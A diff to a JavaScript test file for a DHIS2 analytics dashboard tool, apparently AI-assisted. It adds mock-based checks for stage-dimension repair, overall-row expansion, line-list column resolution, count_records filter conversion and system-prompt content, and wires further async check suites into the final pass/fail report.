+      const de = await ctx.healBareStageDimension('analytics/events/aggregate/WSGAb5XwJ3Y?dimension=ou%3AImspTQPwCqd&dimension=vANAXwtLwcT&stage=WZbXY0S00lP');
+      truthy('a stage UID sent as dimension= (409 E7224) becomes stage= on event analytics, is refused on enrollment analytics, and a data element is left alone',
+        ev.healed && /stage=WZbXY0S00lP$/.test(ev.path) && !/dimension=WZbXY0S00lP/.test(ev.path) && en.refusal && en.refusal._scope === 'stage_as_dimension' && !de.healed && !de.refusal);
+    } finally { ctx.safeDhis2Fetch = saved; }
+  }
+
+  {
+    const saved = ctx.safeDhis2Fetch;
+    ctx.safeDhis2Fetch = async (p) => (p.startsWith('organisationUnits?') ? { organisationUnits: [{ id: 'O6uvpzGd5pu' }, { id: 'fdc6uOvgoji' }] } : { _error: 'x' });
+    try {
+      const spec = { name: 't', vis_type: 'PIVOT_TABLE', org_units: ['ImspTQPwCqd', 'LEVEL-2'], overall_row: true };
+      const r = await ctx.applyOverallRow(spec);
+      const bad = await ctx.applyOverallRow({ org_units: ['LEVEL-2'], overall_row: true });
+      truthy('overall_row turns [parent, LEVEL-n] into the parent as its own row + explicit level-n rows (percent totals computed from all records)', r && r.note && spec.org_units.join() === 'ImspTQPwCqd,O6uvpzGd5pu,fdc6uOvgoji' && !!bad._error);
+    } finally { ctx.safeDhis2Fetch = saved; }
+  }
+  {
+    const llCtx2 = {
+      program: { name: 'P', programType: 'WITH_REGISTRATION' },
+      stages: [{ id: 'WZbXY0S00lP', name: 'First ANC', repeatable: false, deIds: ['vANAXwtLwcT'] }, { id: 'PFDfvmGpsR3', name: 'Care at birth', repeatable: false, deIds: ['vANAXwtLwcT'] }],
+      stagesById: new Map([['WZbXY0S00lP', { id: 'WZbXY0S00lP', name: 'First ANC', repeatable: false, deIds: ['vANAXwtLwcT'] }], ['PFDfvmGpsR3', { id: 'PFDfvmGpsR3', name: 'Care at birth', repeatable: false, deIds: ['vANAXwtLwcT'] }]]),
+      stagesByName: new Map(), teas: new Map(), teaByName: new Map(), pis: new Map(), piByName: new Map(),
+      des: new Map([['vANAXwtLwcT', { id: 'vANAXwtLwcT', name: 'Hemoglobin value', valueType: 'NUMBER', stageIds: ['WZbXY0S00lP', 'PFDfvmGpsR3'] }]]), deByName: new Map(),
+    };
+    const st = await ctx.lineListResolveDimension({ dimension: 'program_status' }, llCtx2, 'ENROLLMENT', new Map(), 'column');
+    const a = await ctx.lineListResolveDimension({ dimension: 'vANAXwtLwcT', program_stage_id: 'WZbXY0S00lP' }, llCtx2, 'ENROLLMENT', new Map(), 'column');
+    const b = await ctx.lineListResolveDimension({ dimension: 'vANAXwtLwcT', program_stage_id: 'PFDfvmGpsR3' }, llCtx2, 'ENROLLMENT', new Map(), 'column');
+    truthy('line list: a status column with no statuses shows every status; the same data element from two stages resolves to two stage-qualified columns',
+      st.kind === 'status' && st.items.length === 3 && a.stageId === 'WZbXY0S00lP' && b.stageId === 'PFDfvmGpsR3');
+  }
+
+  truthy('count_records filters keep the analytics operator (the old "de:value" form 409\'d) and Yes/No becomes 1/0',
+    ctx.countRecordsFilterDimension('FIHEeJwfhZH:eq:true', 'PFDfvmGpsR3.') === 'PFDfvmGpsR3.FIHEeJwfhZH:EQ:1' && ctx.countRecordsFilterDimension('vANAXwtLwcT:lt:11') === 'vANAXwtLwcT:LT:11' && ctx.countRecordsFilterDimension('nonsense') === null);
+
+  // The system prompt teaches the feasibility check on analytics builds.
+  const sp = await ctx.buildSystemPrompt('continue', false, false, ask);
+  truthy('system prompt: the analytics feasibility section rides on a "continue" turn of a dashboard build', /first match each request to what DHIS2 can actually build/.test(sp) && /PIVOT_TABLE/.test(sp));
+  d.apiVersion = savedApi;
+}
+
 // setImmediate: a few checks are async (promise-returning safety gates); they
 // resolve on the microtask queue, so the verdict must run after it drains.
-setImmediate(() => {
+setImmediate(async () => {
+  if (loaded) await runStreamDropChecks().catch((e) => bad(`stream-drop checks threw: ${e && e.stack || e}`));
+  if (loaded) { try { runStreamRetryChecks(); } catch (e) { bad(`stream-retry checks threw: ${e && e.stack || e}`); } }
+  if (loaded) await runStatePersistenceChecks().catch((e) => bad(`state persistence checks threw: ${e && e.stack || e}`));
+  if (loaded) await runPlacementChecks().catch((e) => bad(`placement checks threw: ${e && e.stack || e}`));
+  if (loaded) await runSqlViewChecks().catch((e) => bad(`SQL view checks threw: ${e && e.stack || e}`));
+  if (loaded) await runCustomAppChecks().catch((e) => bad(`custom-app checks threw: ${e && e.stack || e}`));
+  if (loaded) await runCaptureRefreshChecks().catch((e) => bad(`Capture refresh checks threw: ${e && e.stack || e}`));
+  if (loaded) await runRuleScopeAndTetSharingChecks().catch((e) => bad(`rule scope / TET sharing checks threw: ${e && e.stack || e}`));
+  if (loaded) await runDashboardThreadChecks().catch((e) => bad(`dashboard-thread checks threw: ${e && e.stack || e}`));
   console.log('');
+  if (loaded && !screenshotChecksDone) bad('screenshot checks never finished — a SCREENSHOT_* handler did not answer');
+  if (loaded && !hardeningChecksDone) bad('hardening checks never finished — a handler did not answer');
   if (failures) { console.error(`\x1b[31mFAILED\x1b[0m — ${failures} check(s) failed\n`); process.exit(1); }
   console.log('\x1b[32mAll checks passed.\x1b[0m\n');
 });
